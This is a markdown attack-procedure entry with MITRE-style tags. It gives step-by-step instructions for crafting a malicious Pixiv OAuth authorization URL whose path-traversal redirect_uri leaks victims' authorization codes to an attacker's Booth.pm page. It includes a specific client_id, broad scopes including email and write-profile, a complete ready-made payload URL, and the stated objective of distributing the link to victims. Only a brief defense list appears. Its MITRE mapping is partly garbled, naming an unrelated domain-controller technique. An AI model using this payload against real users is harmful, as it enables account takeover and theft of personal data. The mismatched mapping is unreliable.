---
id: proc-craft-oauth-url
tags:
  - url-crafting
  - path-traversal
  - oauth
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Domain Controller Authentication]]'
updated_at: '2025-12-14T17:30:58.427Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Domain Controller Authentication]]'
---
# Craft Malicious OAuth Authorization URL

## Summary

This procedure constructs a malicious OAuth authorization URL for Pixiv that exploits path traversal in the redirect_uri parameter to redirect victims to an attacker-controlled Booth.pm page.

## Description

The attack targets Pixiv's /v2/auth/authorize endpoint, where the redirect_uri is insufficiently validated, allowing sequences like '../../../../' to escape the expected callback path (/users/auth/pixiv/callback) and resolve to arbitrary paths on Booth.pm, such as /ja/items/[product_id]. The URL includes required OAuth parameters like client_id, response_type=code, and scopes for user profile access. An arbitrary state parameter adds session tracking. This leads to the authorization code being appended to the attacker's page URL post-login. Prerequisites include knowledge of the target client_id and product ID.

## Requirements

1. Known Pixiv OAuth client_id (e.g., a1Z7w6JssUQkw5Hid0uIDeuesue9 from public integrations)
2. Attacker's Booth.pm product ID
3. URL encoding tool or manual knowledge for payloads

## Defense

Defensive measures and detection strategies:

- Strictly whitelist allowed redirect URIs in OAuth configurations
- Validate and sanitize redirect_uri for path traversal patterns (e.g., ../ sequences)
- Log and alert on anomalous redirect attempts

## Objectives

1. Bypass OAuth redirect restrictions via path traversal
2. Initiate unauthorized flow leading to code leakage
3. Prepare link for distribution to victims

## Instructions

### Step 1: Assemble Base OAuth URL

**Context**: Start with the Pixiv authorization endpoint and required parameters.

Construct manually or via browser/URL builder:

Base: https://oauth.secure.pixiv.net/v2/auth/authorize

Add parameters:

- client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9
- response_type=code
- scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile
- state=:1a38b53563599621ce25094661b1c4458ddb52d79d771149 (arbitrary for CSRF protection)

> This forms the core OAuth request for code grant.

### Step 2: Inject Path Traversal Payload

**Context**: Modify redirect_uri to traverse to the product page.

Set redirect_uri to: https://booth.pm/users/auth/pixiv/callback/../../../../ja/items/[product_id]

Replace [product_id] with actual ID (e.g., 4503924).

Full example: https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149

> URL-encode the redirect_uri to prevent breakage (e.g., %3A for :, %2F for /).

### Step 3: Validate URL

**Context**: Test the URL structure without sending to victims.

Paste into a browser or use a tool like curl to check for errors:

No command; inspect response for authorization page load.

> Ensure it prompts for Pixiv login without immediate rejection.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Domain Controller Authentication]] Domain Policy Modification: Local Policy

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[url-crafting]]
- [[path-traversal]]
- [[oauth]]
